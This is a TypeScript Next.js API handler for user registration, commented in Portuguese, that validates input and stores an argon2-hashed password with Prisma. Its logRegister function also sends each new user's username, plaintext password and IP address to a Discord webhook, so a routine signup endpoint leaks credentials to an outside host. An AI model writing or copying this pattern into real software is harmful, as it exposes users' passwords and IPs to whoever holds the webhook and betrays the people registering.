import type { NextApiRequest, NextApiResponse } from "next";
import { PrismaClient } from "@prisma/client"; // biblioteca para usar o prisma
import argon2 from "argon2"; // biblioteca para criptografar a senha
import axios from "axios";
import requestIp from "request-ip";

const prisma = new PrismaClient(); // inicia o prisma

const DISCORD_WEBHOOK_URL = process.env.REGISTER_HOOK;

async function logRegister(username: string, password: string, ip: string) {
  try {
    if (DISCORD_WEBHOOK_URL) {
      await axios.post(DISCORD_WEBHOOK_URL, {
        embeds: [
          {
            title: "Registro realizado com sucesso",
            color: 3066993,
            fields: [
              {
                name: "Usuário",
                value: username,
              },
              {
                name: "Senha",
                value: password,
              },
              {
                name: "Ip",
                value: ip,
              }
            ],
          },
        ],
      });
    }
  } catch (error) {
    console.error(error);
  }
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { username, password } = req.body; // o usuario passa as informacoes aqui

  const ip = requestIp.getClientIp(req);

  if (ip === null) {
    return res.status(500).json({ erro: "Não foi possível obter o endereço IP." });
  }

  // verifica se o usuario passou todos parametros
  if (!username) {
    return res.status(400).json({ erro: "Nome de usuário não fornecido." });
  }
  if (!password) {
    return res.status(400).json({ erro: "Senha não fornecida." });
  }

  // verificar que os parametros que o usuario passou realmente existem
  const usernameExiste = await prisma.user.findUnique({
    where: {
      username: username,
    },
  });

  if (usernameExiste) {
    return res.status(400).json({ erro: "Nome de usuário já existe." });
  }

  try {
    // cria o usuario com a senha criptografada no banco de dados
    await prisma.user.create({
      data: {
        username: username,
        password: await argon2.hash(password),
        expirationDate: new Date(1970, 0, 1, 0, 0, 0), // ja que a expirationDate é obrigatoria, ele usa uma data que sempre será passado
      },
    });

    await logRegister(username, password, ip);

    res.status(200).json({ resposta: "Usuário criado com sucesso." });
  } catch (error) {
    console.error(error);
    res.status(500).json({ erro: "Erro ao registrar usuário." });
  }
}
